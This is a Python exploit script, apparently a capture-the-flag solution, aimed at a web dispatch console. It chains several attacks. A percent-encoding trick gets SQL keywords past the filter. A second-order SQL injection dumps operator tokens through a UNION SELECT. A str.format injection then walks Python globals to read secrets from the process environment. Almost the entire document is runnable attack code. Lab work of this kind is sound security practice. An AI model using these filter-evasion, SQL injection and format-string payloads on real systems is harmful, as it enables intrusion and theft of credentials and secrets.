#!/usr/bin/env python3
"""
Ash field dispatch console (AshNet-Dispatch 4.3.0) — sanitiser bypass + second-order SQLi
+ format-string injection.

1. The console filters the RAW request for SQL keywords, so percent-encoding one letter of
   UNION/SELECT slips past the sanitiser while the form parser still decodes the value that
   lands in the stored callsign.
2. /post stores the callsign verbatim; /digest later interpolates every stored callsign into
   a per-callsign query (`... WHERE callsign = '<callsign>'`), so a stored quote breaks out.
3. UNION-dump `operators` to recover the command-net token (role='command').
4. /report authenticates that token and renders a caller-supplied `fmt` with str.format(),
   where `{dispatch.__init__.__globals__[os].environ[FLAG]}` reads the flag out of the
   process environment.

Rate limit on the instance is 15 requests / 60 s, so this script sleeps between calls.
"""

import html
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://w02.ctf.chronos-security.ro:33927").rstrip("/")
UA = "ash-dispatch-analyst/1.0"
PAUSE = 6.0


def request(path: str, data: bytes | None = None, ctype: str | None = None) -> tuple[int, str]:
    req = urllib.request.Request(BASE + path, data=data, method="POST" if data else "GET",
                                 headers={"User-Agent": UA, **({"Content-Type": ctype} if ctype else {})})
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def encode_keywords(payload: str) -> str:
    """Percent-encode one letter per blocked keyword so the raw request has no keyword."""
    payload = payload.replace("UNION", "%55NION").replace("union", "%75nion")
    payload = payload.replace("SELECT", "%53ELECT").replace("select", "%73elect")
    payload = payload.replace("sqlite", "sql%69te")
    # keep the %-escapes introduced above intact; encode everything else once
    return urllib.parse.quote(payload, safe="%")


def post_dispatch(callsign: str, body: str = "x") -> int:
    payload = ("callsign=" + encode_keywords(callsign) + "&body=" + urllib.parse.quote(body)).encode()
    code, text = request("/post", payload, "application/x-www-form-urlencoded")
    print("[post   ] HTTP %d %s" % (code, re.sub(r"\s+", " ", text.split("</h1>")[-1])[:60]))
    return code


def digest_pre() -> str:
    code, text = request("/digest")
    match = re.search(r"<pre>(.*?)</pre>", text, re.S)
    print("[digest ] HTTP %d" % code)
    return html.unescape(match.group(1)) if match else ""


def main() -> int:
    injection = ("X' UNION SELECT callsign||'|'||token||'|'||role FROM operators WHERE '1'='1")
    post_dispatch(injection)
    time.sleep(PAUSE)

    pre = digest_pre()
    operators = re.findall(r"^  - (\S+)\|(\S+)\|(\S+)$", pre, re.M)
    for callsign, token, role in operators:
        print("[operator] %-8s %-24s %s" % (callsign, token, role))
    command = next((t for c, t, r in operators if r == "command"), None)
    if not command:
        print("no command token recovered")
        return 1

    time.sleep(PAUSE)
    fmt = "{dispatch.__init__.__globals__[os].environ[FLAG]}"
    query = urllib.parse.urlencode({"token": command, "fmt": fmt})
    code, text = request("/report?" + query)
    rendered = re.search(r"<pre>(.*?)</pre>", text, re.S)
    value = html.unescape(rendered.group(1)).strip() if rendered else text[:200]
    print("[report ] HTTP %d -> %s" % (code, value))

    flag = re.search(r"CSCTF\{[^}]+\}", value)
    if flag:
        print("[flag   ] %s" % flag.group(0))
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
